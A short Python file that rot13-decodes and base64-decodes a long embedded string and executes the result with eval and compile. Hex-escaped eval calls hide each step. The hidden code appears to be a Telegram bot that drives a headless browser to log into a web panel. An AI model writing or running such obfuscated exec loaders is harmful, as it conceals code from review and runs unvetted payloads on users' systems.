import base64, codecs
magic = ''
love = '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'
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
